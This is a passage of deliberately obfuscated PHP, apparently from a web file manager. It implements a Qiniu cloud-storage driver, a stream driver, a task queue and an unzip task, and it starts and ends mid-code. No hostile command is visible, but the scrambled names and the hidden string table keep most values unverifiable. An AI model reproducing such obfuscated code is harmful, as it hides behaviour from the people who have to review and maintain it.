$ÈŸ‰åÌ—[12], 0, 10); } return $ÇœŞÖÈ©; } public function listPath($Ø²ûùş–, $éı‘îÂŠ = false) { $Û‘÷œ =& $_SERVER[®»±”ó²]; $êÑ•½æ = $this->fileList($Ø²ûùş–, $Û‘÷œ[8], !0); foreach ($êÑ•½æ[$Û‘÷œ[85]] as $†×¤ñØŸ => $¦‹Ö©ô½) { $êÑ•½æ[$Û‘÷œ[85]][$†×¤ñØŸ] = $this->folderInfo($¦‹Ö©ô½, $éı‘îÂŠ); } foreach ($êÑ•½æ[$Û‘÷œ[86]] as $†×¤ñØŸ => $¦‹Ö©ô½) { $êÑ•½æ[$Û‘÷œ[86]][$†×¤ñØŸ] = $this->fileInfo($¦‹Ö©ô½[$Û‘÷œ[32]], $éı‘îÂŠ, $¦‹Ö©ô½); } return $êÑ•½æ; } public function has($õ˜üØÚü, $êİÉ±Î“ = false, $îäÈŒ = true) { $õÏ×²›º =& $_SERVER[®»±”ó²]; $õ˜üØÚü = trim($õ˜üØÚü, $õÏ×²›º[8]); $§õ©¥”× = empty($õ˜üØÚü) && $õ˜üØÚü !== $õÏ×²›º[231] ? $õÏ×²›º[12] : $õ˜üØÚü . $õÏ×²›º[8]; $ÎÜ§”ÑÎ = $õÏ×²›º[12]; $Úş€óÕø = 500; $È‘ºËïô = $õÏ×²›º[8]; $Š…ùÃÇ = $Åƒõ•ª = 0; while (!0) { check_abort(); list($øşó¾÷Ú, $İÕ©ç’ä) = $this->bucketManager->listFiles($this->bucket, $§õ©¥”×, $ÎÜ§”ÑÎ, $Úş€óÕø, $È‘ºËïô); if ($İÕ©ç’ä) { break; } $ÎÜ§”ÑÎ = array_key_exists($õÏ×²›º[1496], $øşó¾÷Ú) ? $ÎÜ§”ÑÎ = $øşó¾÷Ú[$õÏ×²›º[1551]] : $õÏ×²›º[12]; if ($êİÉ±Î“) { if (!empty($øşó¾÷Ú[$õÏ×²›º[1552]])) { $Š…ùÃÇ += count($øşó¾÷Ú[$õÏ×²›º[1552]]); } if (!empty($øşó¾÷Ú[$õÏ×²›º[1553]])) { $Åƒõ•ª += count($øşó¾÷Ú[$õÏ×²›º[1553]]); } if ($ÎÜ§”ÑÎ === $õÏ×²›º[12]) { break; } continue; } if ($îäÈŒ) { if (!empty($øşó¾÷Ú[$õÏ×²›º[1552]])) { return !0; } } else { if (!empty($øşó¾÷Ú[$õÏ×²›º[1553]])) { return !0; } } if ($ÎÜ§”ÑÎ === $õÏ×²›º[12]) { break; } } if ($êİÉ±Î“) { return array($õÏ×²›º[242] => $Š…ùÃÇ, $õÏ×²›º[243] => $Åƒõ•ª); } return !1; } public function listAll($®ûï¿Ê) { $“¶®¿Œ¶ =& $_SERVER[®»±”ó²]; $Ï±Ú•—¤ = $this->fileList($®ûï¿Ê, $“¶®¿Œ¶[12], !0); $ãÇ›äÃ´ = array_to_keyvalue($Ï±Ú•—¤[$“¶®¿Œ¶[86]], $“¶®¿Œ¶[32]); foreach ($Ï±Ú•—¤[$“¶®¿Œ¶[85]] as $ğ¢äšğ¬) { if (is_string($ğ¢äšğ¬)) { $ãÇ›äÃ´[$ğ¢äšğ¬] = array($“¶®¿Œ¶[79] => 0); } } return $this->listAllFiles($®ûï¿Ê, $ãÇ›äÃ´); } private function fileList($¢áÍ´Âã, $²¦ò™éñ = '', $æî×İÅ¶ = 0) { $ìóü„” =& $_SERVER[®»±”ó²]; $¢áÍ´Âã = trim($¢áÍ´Âã, $ìóü„”[8]); $Æàî¸¬Ó = empty($¢áÍ´Âã) && $¢áÍ´Âã !== $ìóü„”[231] ? $ìóü„”[12] : $¢áÍ´Âã . $ìóü„”[8]; $œ¡Ç‚ß = $ìóü„”[12]; $€Âá—±‰ = 1000; $§ÄÊÇÒ = $»—ÃÆÈÄ = array(); while (!0) { check_abort(); list($âãºÓÈ, $úÀ¾şí) = $this->bucketManager->listFiles($this->bucket, $Æàî¸¬Ó, $œ¡Ç‚ß, $€Âá—±‰, $²¦ò™éñ); if ($úÀ¾şí) { break; } $œ¡Ç‚ß = array_key_exists($ìóü„”[1496], $âãºÓÈ) ? $œ¡Ç‚ß = $âãºÓÈ[$ìóü„”[1551]] : $ìóü„”[12]; $¤€××ÊØ = isset($âãºÓÈ[$ìóü„”[1552]]) ? $âãºÓÈ[$ìóü„”[1552]] : array(); $ğÑøŸ  = isset($âãºÓÈ[$ìóü„”[1553]]) ? $âãºÓÈ[$ìóü„”[1553]] : array(); foreach ($¤€××ÊØ as $äéÄÓ®—) { if ($äéÄÓ®—[$ìóü„”[97]] == $Æàî¸¬Ó) { continue; } $ã†û·¾ = $äéÄÓ®—[$ìóü„”[97]]; $¶µ¨éÖ† = $äéÄÓ®—[$ìóü„”[1549]]; $äéÄÓ®—[$ìóü„”[32]] = $ã†û·¾; $äéÄÓ®—[$ìóü„”[79]] = $¶µ¨éÖ†; $È°º•· = $¶µ¨éÖ† == 0 && substr($ã†û·¾, strlen($ã†û·¾) - 1, 1) == $ìóü„”[8] ? !0 : !1; $this->cacheMethodInfoSet($ã†û·¾, $È°º•·, $äéÄÓ®—); if ($È°º•·) { $§ÄÊÇÒ[] = $ã†û·¾; continue; } $»—ÃÆÈÄ[] = $æî×İÅ¶ ? $äéÄÓ®— : $ã†û·¾; } foreach ($ğÑøŸ  as $ã†û·¾) { if ($ã†û·¾ == $Æàî¸¬Ó) { continue; } $§ÄÊÇÒ[] = $ã†û·¾; $this->cacheMethodInfoSet($ã†û·¾, !0); } if ($œ¡Ç‚ß === $ìóü„”[12]) { break; } } $this->cacheMethodInfoSet($¢áÍ´Âã, !0); return array($ìóü„”[85] => $§ÄÊÇÒ, $ìóü„”[86] => $»—ÃÆÈÄ); } public function canRead($¢åàÕ£‡) { return $this->exist($¢åàÕ£‡) ? !0 : !1; } public function canWrite($ú«¸¾èÜ) { return $this->exist($ú«¸¾èÜ) ? !0 : !1; } public function getContent($°—™—°Ê) { return $this->fileSubstr($°—™—°Ê, 0, -1); } public function setContent($Û‘˜îÛ¡, $ıŸÚóŸô = '') { $ŸùÈ­¶  = $this->tempFile($this->pathThis($Û‘˜îÛ¡)); file_put_contents($ŸùÈ­¶ , $ıŸÚóŸô); if ($this->upload($Û‘˜îÛ¡, $ŸùÈ­¶ )) { $this->tempFileRemve($ŸùÈ­¶ ); return !0; } return !1; } public function refreshUrls($ñ™ÇÇÅÚ) { $£¯ÌÓí» =& $_SERVER[®»±”ó²]; $ë ÖóÏœ = array(); if (is_array($ñ™ÇÇÅÚ)) { foreach ($ñ™ÇÇÅÚ as $§ÈÑŞì) { $ë ÖóÏœ[] = $this->link($§ÈÑŞì); } } else { $ë ÖóÏœ[] = $this->link($ñ™ÇÇÅÚ); } $Ë·³ı‹ = new Qiniu\Cdn\CdnManager($this->auth); list($ùÎ‚í, $·†ÎÙà) = $Ë·³ı‹->refreshUrls($ë ÖóÏœ); if ($·†ÎÙà) { return !1; } return $ùÎ‚í[$£¯ÌÓí»[1276]] == $£¯ÌÓí»[840] ? !0 : !1; } public function fileSubstr($‰ ıåë, $ÎìÉ òÁ, $ ¦¤­ßø) { $éÙ‚»¬õ =& $_SERVER[®»±”ó²]; if (!($¥ı’ÌÕ = $this->link($‰ ıåë))) { return !1; } $ò¤’´É = !1; if ($ ¦¤­ßø > 0) { $Òº€È¦ = $ÎìÉ òÁ + $ ¦¤­ßø - 1; $ò¤’´É = array($éÙ‚»¬õ[1554] . $ÎìÉ òÁ . $éÙ‚»¬õ[464] . $Òº€È¦); } $Çªì‡Ûê = url_request($¥ı’ÌÕ, $éÙ‚»¬õ[1515], !1, $ò¤’´É); return $Çªì‡Ûê[$éÙ‚»¬õ[830]] ? $Çªì‡Ûê[$éÙ‚»¬õ[1299]] : !1; } public function upload($ÔÏˆëÛĞ, $©¸ïØ‰ı, $’ĞôìàÍ = false, $§Øû‰É´ = REPEAT_REPLACE) { $ÆÜ–³ÆÎ = new Qiniu\Storage\UploadManager(); $şà‰ƒÄ½ = $this->auth->uploadToken($this->bucket, $ÔÏˆëÛĞ); $ò×•ê = get_file_mime(get_path_ext($©¸ïØ‰ı)); list($õ¾õôÕ‡, $½Âµâç¡) = $ÆÜ–³ÆÎ->putFile($şà‰ƒÄ½, $ÔÏˆëÛĞ, $©¸ïØ‰ı, null, $ò×•ê); return $½Âµâç¡ ? !1 : $this->getPathOuter($ÔÏˆëÛĞ); } public function uploadFormData($¢¤ô—å×, $€šò‰”æ = 3600) { return $this->uploadToken($¢¤ô—å×, $€šò‰”æ); } public function uploadMultiData($¯ßÎÈâÍ, $ı·¸ÅÂó = 3600) { return $this->uploadToken($¯ßÎÈâÍ, $ı·¸ÅÂó); } private function uploadToken($‹âÃËûî, $’ÑÎî±· = 3600) { $ç£‹û‹‹ =& $_SERVER[®»±”ó²]; $–ŞÏ‚¸ = $’ÑÎî±·; $ç³ãåë­ = array($ç£‹û‹‹[1555] => $ç£‹û‹‹[1556]); $ä„¥æıÙ = $‹âÃËûî; $áºÕÄ± = $this->auth->uploadToken($this->bucket, $ä„¥æıÙ, $–ŞÏ‚¸, $ç³ãåë­, !0); $¡„ôç³ç = empty($this->region) || $this->region == $ç£‹û‹‹[1557] ? $ç£‹û‹‹[12] : $ç£‹û‹‹[464] . $this->region; $ÒµÔÁø = http_type() . "\72\57\x2f\x75\160\154\157\x61\144{$¡„ôç³ç}\56\161\x69\156\x69\x75\x70\56\143\x6f\155\x2f"; return array($ç£‹û‹‹[1558] => $áºÕÄ±, $ç£‹û‹‹[1559] => $ÒµÔÁø); } public function download($ßçĞ¢–“, $„ÍÜºîá) { $Ç’ÎÓÖİ = IO::getPathInner(IO::mkfile($„ÍÜºîá)); if (!($æö¸Êò÷ = $this->link($ßçĞ¢–“))) { return !1; } $ğ¸›Ø¹ñ = 0; $¹¢Ø–¶ñ = 1024 * 200; $¹Õø®º = fopen($Ç’ÎÓÖİ, $_SERVER[®»±”ó²][1560]); while (!0) { $‘°»“œÛ = $this->fileSubstr($ßçĞ¢–“, $ğ¸›Ø¹ñ, $¹¢Ø–¶ñ); if ($‘°»“œÛ === !1) { return !1; } fwrite($¹Õø®º, $‘°»“œÛ); $ğ¸›Ø¹ñ += $¹¢Ø–¶ñ; if (strlen($‘°»“œÛ) < $¹¢Ø–¶ñ) { break; } } fclose($¹Õø®º); return $„ÍÜºîá; } public function link($¾œÙ©Ö±, $Ï–ôª¿í = '') { if (!$this->isFile($¾œÙ©Ö±)) { return !1; } $ãŠáÌÙÃ = $this->getHost() . $_SERVER[®»±”ó²][8] . $this->pathEncode($¾œÙ©Ö±) . $Ï–ôª¿í; return $this->auth->privateDownloadUrl($ãŠáÌÙÃ, 3600 * 12); } public function fileOut($™ÀË¤è, $±Ó•´Í = false, $Ê¿ï€ü = false, $üÏç’ = '') { $¿ÖÂ·îÔ =& $_SERVER[®»±”ó²]; if ($this->isFileOutServer()) { return $this->fileOutServer($™ÀË¤è, $±Ó•´Í, $Ê¿ï€ü, $üÏç’); } if (!$Ê¿ï€ü) { $Ê¿ï€ü = $this->pathThis($™ÀË¤è); } $¨–š‚³Ã = $±Ó•´Í ? $¿ÖÂ·îÔ[1561] . rawurlencode($Ê¿ï€ü) : $¿ÖÂ·îÔ[12]; $˜‰ó‚‡• = $this->link($™ÀË¤è, $¨–š‚³Ã); $this->fileOutLink($˜‰ó‚‡•); } public function fileOutServer($şå¹˜ôß, $ŒÁ‡êê‡ = false, $ÑˆÆë° = false, $¥–Ê˜ÇŞ = '') { parent::fileOut($şå¹˜ôß, $ŒÁ‡êê‡, $ÑˆÆë°, $¥–Ê˜ÇŞ); } public function fileOutImage($ú¸òŸ“Ş, $èŞ»‚ÅÀ = 250) { if ($this->size($ú¸òŸ“Ş) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ú¸òŸ“Ş, $èŞ»‚ÅÀ); } $‡î‹ˆÉæ = $this->link($ú¸òŸ“Ş, $_SERVER[®»±”ó²][1562] . $èŞ»‚ÅÀ); $this->fileOutLink($‡î‹ˆÉæ); } public function fileOutImageServer($³¼ı‚—ä, $Ôº‰Â¥ = 250) { parent::fileOutImage($³¼ı‚—ä, $Ôº‰Â¥); } public function hashMd5($Í€ÛÄÔÒ) { $Ø¼åá¶ =& $_SERVER[®»±”ó²]; $Ù¡Æúö = $this->objectMeta($Í€ÛÄÔÒ); return isset($Ù¡Æúö[$Ø¼åá¶[248]]) ? $Ù¡Æúö[$Ø¼åá¶[248]] : !1; $ÆâğîÕ¾ = $this->link($Í€ÛÄÔÒ, $Ø¼åá¶[1563]); } public function size($‘±—“¡) { $œ»³ÕÃ = $this->objectMeta($‘±—“¡); return $œ»³ÕÃ ? $œ»³ÕÃ[$_SERVER[®»±”ó²][79]] : 0; } public function info($·Êõ½Ÿ©) { if ($this->isFolder($·Êõ½Ÿ©)) { return $this->folderInfo($·Êõ½Ÿ©); } else { if ($this->isFile($·Êõ½Ÿ©)) { return $this->fileInfo($·Êõ½Ÿ©); } } return !1; } public function exist($ú©ÔŠØŒ) { return $this->isFile($ú©ÔŠØŒ) || $this->isFolder($ú©ÔŠØŒ); } public function isFile($ÁÖ£²Ğµ) { return !$this->isFolder($ÁÖ£²Ğµ) && $this->objectMeta($ÁÖ£²Ğµ); } public function isFolder($¬âò£áŠ) { return $this->cacheMethod($_SERVER[®»±”ó²][180], $¬âò£áŠ); } protected function objectMeta($öèƒ…Ëî) { return $this->cacheMethod($_SERVER[®»±”ó²][182], $öèƒ…Ëî); } protected function _objectMeta($Œî×öÔ¨) { $Ï¹¤ôá’ =& $_SERVER[®»±”ó²]; list($¨öçƒ¥, $›•ËïµŒ) = $this->bucketManager->stat($this->bucket, $Œî×öÔ¨); if ($¨öçƒ¥) { $¨öçƒ¥[$Ï¹¤ôá’[79]] = intval($¨öçƒ¥[$Ï¹¤ôá’[1549]]); } return $¨öçƒ¥; } protected function _isFolder($ïìø—ä”) { $¥Óçœ¨Ï =& $_SERVER[®»±”ó²]; if ($ïìø—ä” == $¥Óçœ¨Ï[12] || $ïìø—ä” == $¥Óçœ¨Ï[8]) { return !0; } list($Ùøè¥†, $ŒÆ‚şç¿) = $this->bucketManager->listFiles($this->bucket, trim($ïìø—ä”, $¥Óçœ¨Ï[8]) . $¥Óçœ¨Ï[8], $¥Óçœ¨Ï[12], 1, $¥Óçœ¨Ï[8]); return !empty($Ùøè¥†[$¥Óçœ¨Ï[1552]]) || !empty($Ùøè¥†[$¥Óçœ¨Ï[1553]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¯òÀìŞ, $ÖÚååÕƒ = 0) { parent::__construct(); $this->source = $¯òÀìŞ; $this->sourceSize = $ÖÚååÕƒ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ì¨ô‹ö­ = false) { return $this->sourceSize; } public function getContent($†çĞÕß¥ = false) { return $this->fileSubstr($†çĞÕß¥, 0, $this->sourceSize); } public function fileSubstr($¦¡¡õª = false, $ î»”±Ã = 0, $äïõÔü¾ = 0) { if (!$äïõÔü¾) { $äïõÔü¾ = $this->sourceSize; } $ŠİÄñÅ  = $this->sourceSize - $ î»”±Ã; if ($äïõÔü¾ >= $ŠİÄñÅ ) { $äïõÔü¾ = $ŠİÄñÅ ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ î»”±Ã, $äïõÔü¾); } if ($this->sourceType == self::TYPE_FILE) { if ($äïõÔü¾ <= 0) { return $_SERVER[®»±”ó²][12]; } $ƒ—æ—àï = ftell($this->source); fseek_64($this->source, $ƒ—æ—àï + $ î»”±Ã); $ƒ÷»³³ï = @fread($this->source, $äïõÔü¾); fseek_64($this->source, $ƒ—æ—àï); return $ƒ÷»³³ï; } } public function hashMd5($º…É×ìº = false) { return md5($this->getContent()); } public static function hash($ÚÏã‹¹Û, $Óñøäè = 0) { $õàŠ”Ò… = new PathDriverStream($ÚÏã‹¹Û, $Óñøäè); return $õàŠ”Ò…->hashSimple($ÚÏã‹¹Û); } public static function md5($Ç–ˆø„ˆ, $û‰×Û˜Æ = 0) { $˜‡¬ºÍ = new PathDriverStream($Ç–ˆø„ˆ, $û‰×Û˜Æ); return $˜‡¬ºÍ->hashMd5($Ç–ˆø„ˆ); } } goto aÔ™ºŒ¿„â; D—¦šÜ¤×Ê: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\153\x51\165\145\165\x65\114\145\156\147\x74\x68"; const QUEUE_DATA = "\164\141\163\x6b\x51\165\145\165\x65\104\x61\x74\141"; const QUEUE_TIME = "\x74\x61\163\x6b\121\165\x65\165\145\x4c\x61\x73\164\122\165\x6e"; const QUEUE_THREAD = "\x74\x61\x73\153\121\x75\x65\x75\x65\124\x68\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($í€ä¯°, $Õß ãÎô = array(), $‘‘Á«ğ = '', $Ç´¨¦ = '') { $–¿Èã–ˆ =& $_SERVER[®»±”ó²]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ç´¨¦ && array_find_by_field(self::$listData, $–¿Èã–ˆ[97], $Ç´¨¦)) { return !0; } if ($Ç´¨¦ && array_find_by_field(self::$listDataAdd, $–¿Èã–ˆ[97], $Ç´¨¦)) { return !0; } self::$listDataAdd[] = array($–¿Èã–ˆ[344] => $í€ä¯°, $–¿Èã–ˆ[1891] => $Õß ãÎô, $–¿Èã–ˆ[537] => $‘‘Á«ğ, $–¿Èã–ˆ[97] => $Ç´¨¦); return !0; } public static function addSubmit() { $Ì’×È„ƒ =& $_SERVER[®»±”ó²]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Ì’×È„ƒ[1892] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Ì’×È„ƒ[12], $Ì’×È„ƒ[537])), $Ì’×È„ƒ[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ê¶†¶¿ş, $ó÷ÖÙ¶ü = array(), $×Š¸ñ™¥ = '', $ÄŒ½µ„ = '') { $º¹Üğ‚ =& $_SERVER[®»±”ó²]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Òø‹ê° = self::getAll(); if ($ÄŒ½µ„ && array_find_by_field($Òø‹ê°, $º¹Üğ‚[97], $ÄŒ½µ„)) { return !0; } $Òø‹ê°[] = array($º¹Üğ‚[344] => $Ê¶†¶¿ş, $º¹Üğ‚[1891] => $ó÷ÖÙ¶ü, $º¹Üğ‚[537] => $×Š¸ñ™¥, $º¹Üğ‚[97] => $ÄŒ½µ„); self::setAll($Òø‹ê°); write_log($º¹Üğ‚[1892] . $×Š¸ñ™¥, $º¹Üğ‚[198]); return !0; } public static function run() { $èŞ¤™Œ€ =& $_SERVER[®»±”ó²]; $Ï·íù‚ = self::getAll(); $ÇÅİŸ = array_shift($Ï·íù‚); if (!$ÇÅİŸ) { return !1; } self::setAll($Ï·íù‚); $¤†µÊÑß = timeFloat(); $§òè½£­ = $èŞ¤™Œ€[12]; try { $§òè½£­ = Hook::apply($ÇÅİŸ[$èŞ¤™Œ€[344]], $ÇÅİŸ[$èŞ¤™Œ€[1891]]); } catch (Exception $„Öö‚»») { write_log($„Öö‚»», $èŞ¤™Œ€[1276]); } $§›¿Úáº = number_format(timeFloat() - $¤†µÊÑß, 3) . $èŞ¤™Œ€[1807]; if ($§òè½£­ && is_string($§òè½£­)) { $§›¿Úáº = $§›¿Úáº . $èŞ¤™Œ€[1893] . $§òè½£­; } write_log($èŞ¤™Œ€[1894] . $ÇÅİŸ[$èŞ¤™Œ€[537]] . $èŞ¤™Œ€[1895] . $§›¿Úáº, $èŞ¤™Œ€[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ùíñ‘ÈÈ =& $_SERVER[®»±”ó²]; $à©®ë“â = self::threadCount() + 1; if ($à©®ë“â > 3 || !self::count()) { return; } write_log($ùíñ‘ÈÈ[1896] . $à©®ë“â, $ùíñ‘ÈÈ[198]); Cache::set(self::QUEUE_THREAD, $à©®ë“â, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ùíñ‘ÈÈ[1897], $ùíñ‘ÈÈ[198]); } public static function getKey($Ï¹½à³Æ, $œŠé¶ˆ” = "\x69\x6e\164") { $Šê…©¶Ğ =& $_SERVER[®»±”ó²]; Cache::removeMemory($Ï¹½à³Æ); $œÉ°ÏÊç = Cache::get($Ï¹½à³Æ); if ($œŠé¶ˆ” == $Šê…©¶Ğ[366]) { return $œÉ°ÏÊç ? intval($œÉ°ÏÊç) : 0; } if ($œŠé¶ˆ” == $Šê…©¶Ğ[1898]) { return is_array($œÉ°ÏÊç) ? $œÉ°ÏÊç : array(); } return $œÉ°ÏÊç; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[®»±”ó²][1898]); } public static function setAll($åÉ•†Úé) { $ÏµË¯¦ı = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($åÉ•†Úé), $ÏµË¯¦ı); Cache::set(self::QUEUE_DATA, $åÉ•†Úé, $ÏµË¯¦ı); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¡¿‰ñ£Œ, $¦èŒÛ˜ = 5.0) { if (!$¡¿‰ñ£Œ) { return; } $Š¬Ûµ’® = Cache::get($¡¿‰ñ£Œ); if (!$Š¬Ûµ’® || timeFloat() - floatVal($Š¬Ûµ’®) >= $¦èŒÛ˜) { Cache::set($¡¿‰ñ£Œ, timeFloat(), $¦èŒÛ˜ * 10); return !0; } return !1; } public static function timeLimitCall($—Ì“¸¿ş, $– º¦óô, $£ó¥—¬, $ÜŠƒå§Ú = 5.0) { $ ½‰½œÚ =& $_SERVER[®»±”ó²]; if (!$—Ì“¸¿ş || !$– º¦óô) { return; } self::$asyncAdd = !0; $“»ıÄ¨ì = $ ½‰½œÚ[1899]; $ÓŠ¼…£ = Cache::get($“»ıÄ¨ì, !0); $ïƒÖÉ–¨ = array($ ½‰½œÚ[1900] => timeFloat(), $ ½‰½œÚ[1901] => timeFloat(), $ ½‰½œÚ[344] => $– º¦óô, $ ½‰½œÚ[1891] => $£ó¥—¬, $ ½‰½œÚ[207] => $ÜŠƒå§Ú); if (is_array($ÓŠ¼…£[$—Ì“¸¿ş])) { $ïƒÖÉ–¨[$ ½‰½œÚ[1901]] = $ÓŠ¼…£[$—Ì“¸¿ş][$ ½‰½œÚ[1901]]; } if (is_array($ÓŠ¼…£[$—Ì“¸¿ş])) { if (timeFloat() - $ÓŠ¼…£[$—Ì“¸¿ş][$ ½‰½œÚ[1900]] < $ïƒÖÉ–¨[$ ½‰½œÚ[207]] * 0.3) { return; } $ïƒÖÉ–¨[$ ½‰½œÚ[1901]] = $ÓŠ¼…£[$—Ì“¸¿ş][$ ½‰½œÚ[1901]]; } $ÓŠ¼…£[$—Ì“¸¿ş] = $ïƒÖÉ–¨; Cache::set($“»ıÄ¨ì, $ÓŠ¼…£, 60); Cache::removeMemory($“»ıÄ¨ì); write_log($ ½‰½œÚ[1902] . $—Ì“¸¿ş . $ ½‰½œÚ[74] . $– º¦óô, $ ½‰½œÚ[198]); } public static function timeLimitCallLoop() { $é¥Ç÷† =& $_SERVER[®»±”ó²]; $äµÀ¶åĞ = array($é¥Ç÷†[1903]); $ßÍÓğè = in_array(strtolower(ACTION), $äµÀ¶åĞ); if (!$ßÍÓğè && !self::$asyncAdd) { return; } $ÙÚ‡İğ¸ = $é¥Ç÷†[1899]; $ÙÓ®è¡× = Cache::get($ÙÚ‡İğ¸, !0); if (!$ÙÓ®è¡× || count($ÙÓ®è¡×) <= 0) { return; } $—ŞŞŒÂ» = !1; $ÄäÆê’ğ = timeFloat(); $µ‡ÖÎÔµ = array(); foreach ($ÙÓ®è¡× as $ûÑÈË¼å => $şïõöÖ») { if ($ÄäÆê’ğ - $şïõöÖ»[$é¥Ç÷†[1901]] > $şïõöÖ»[$é¥Ç÷†[207]]) { $—ŞŞŒÂ» = !0; try { Hook::apply($şïõöÖ»[$é¥Ç÷†[344]], $şïõöÖ»[$é¥Ç÷†[1891]]); write_log($é¥Ç÷†[1904] . $ûÑÈË¼å . $é¥Ç÷†[74] . $şïõöÖ»[$é¥Ç÷†[344]] . $é¥Ç÷†[1905] . ACTION, $é¥Ç÷†[198]); } catch (Exception $“ëÎ”) { } continue; } $µ‡ÖÎÔµ[$ûÑÈË¼å] = $şïõöÖ»; } if (!$—ŞŞŒÂ») { return; } if (!$µ‡ÖÎÔµ) { return Cache::remove($ÙÚ‡İğ¸); } Cache::set($ÙÚ‡İğ¸, $µ‡ÖÎÔµ, 60); Cache::removeMemory($ÙÚ‡İğ¸); } public static function finished($³Ä’¦âœ, $¶ÈÇ½í¸) { $ŸÀ›à•ò =& $_SERVER[®»±”ó²]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ŸÀ›à•ò[344] => $³Ä’¦âœ, $ŸÀ›à•ò[1891] => $¶ÈÇ½í¸); } private static function finishedRun() { $Üäù‹ =& $_SERVER[®»±”ó²]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ûİ òâŠ) { try { Hook::apply($ûİ òâŠ[$Üäù‹[344]], $ûİ òâŠ[$Üäù‹[1891]]); } catch (Exception $íèå¿Ê) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $×ìç´ã– =& $_SERVER[®»±”ó²]; parent::startAfter(); Hook::bind($×ìç´ã–[1906], array($this, $×ìç´ã–[1907])); Hook::bind($×ìç´ã–[1290], array($this, $×ìç´ã–[1908])); Hook::bind($×ìç´ã–[1909], array($this, $×ìç´ã–[1910])); $ò—¹”ÅØ =& $this->task; $ò—¹”ÅØ[$×ìç´ã–[1911]] = $×ìç´ã–[1291]; if (!$ò—¹”ÅØ[$×ìç´ã–[1678]]) { $ò—¹”ÅØ[$×ìç´ã–[1678]] = LNG($×ìç´ã–[1912]); } } protected function endAfter() { $İ§Ïıô÷ =& $_SERVER[®»±”ó²]; parent::endAfter(); Hook::unbind($İ§Ïıô÷[1906], array($this, $İ§Ïıô÷[1907])); Hook::unbind($İ§Ïıô÷[1290], array($this, $İ§Ïıô÷[1908])); Hook::unbind($İ§Ïıô÷[1909], array($this, $İ§Ïıô÷[1910])); } public function updateAfter() { $òµ‚øª =& $_SERVER[®»±”ó²]; $î¾•¸¿ =& $this->task; if (!$î¾•¸¿[$òµ‚øª[1150]] || !$î¾•¸¿[$òµ‚øª[844]]) { if ($î¾•¸¿[$òµ‚øª[1911]] != $òµ‚øª[390]) { return; } } if ($î¾•¸¿[$òµ‚øª[1911]] == $òµ‚øª[1291]) { $šè²®Ø = 0; if ($î¾•¸¿[$òµ‚øª[1845]]) { $šè²®Ø = $î¾•¸¿[$òµ‚øª[1846]] / $î¾•¸¿[$òµ‚øª[1845]]; } $î¾•¸¿[$òµ‚øª[1793]] = $šè²®Ø * 0.3; } else { if ($î¾•¸¿[$òµ‚øª[1911]] == $òµ‚øª[390]) { $šè²®Ø = $î¾•¸¿[$òµ‚øª[1792]] / $î¾•¸¿[$òµ‚øª[1150]]; $î¾•¸¿[$òµ‚øª[1793]] = 0.3 + $šè²®Ø * 0.4; } else { if ($î¾•¸¿[$òµ‚øª[1911]] == $òµ‚øª[110]) { $Ì¨¢¥×• = 0; if ($î¾•¸¿[$òµ‚øª[1847]] == $òµ‚øª[110]) { $Ì¨¢¥×• = $î¾•¸¿[$òµ‚øª[1846]]; } $šè²®Ø = ($î¾•¸¿[$òµ‚øª[1850]] + $Ì¨¢¥×•) / $î¾•¸¿[$òµ‚øª[844]]; $î¾•¸¿[$òµ‚øª[1793]] = 0.3 + 0.4 + $šè²®Ø * 0.3; } } } if ($î¾•¸¿[$òµ‚øª[1793]] > 0) { $›´ÁˆÏ¾ = timeFloat() - $î¾•¸¿[$òµ‚øª[1795]] - $î¾•¸¿[$òµ‚øª[1798]]; $î¾•¸¿[$òµ‚øª[1799]] = $›´ÁˆÏ¾ * (1 - $î¾•¸¿[$òµ‚øª[1793]]) / $î¾•¸¿[$òµ‚øª[1793]]; } } public function addFile($Ş€†·í«) { $¯…¢›—ƒ =& $_SERVER[®»±”ó²]; $‚·¾øá‚ =& $this->task; $¨›ß€ş = IO::info($Ş€†·í«); $‚·¾øá‚[$¯…¢›—ƒ[1843]] = $¨›ß€ş[$¯…¢›—ƒ[32]]; $‚·¾øá‚[$¯…¢›—ƒ[1845]] = $¨›ß€ş[$¯…¢›—ƒ[79]]; $‚·¾øá‚[$¯…¢›—ƒ[1846]] = 0; $‚·¾øá‚[$¯…¢›—ƒ[1152]] = $¯…¢›—ƒ[1866]; $‚·¾øá‚[$¯…¢›—ƒ[1847]] = $¯…¢›—ƒ[1291]; $‚·¾øá‚[$¯…¢›—ƒ[844]] = $¨›ß€ş[$¯…¢›—ƒ[79]]; $‚·¾øá‚[$¯…¢›—ƒ[1150]] = 1; $ášÎÔå° = 0; 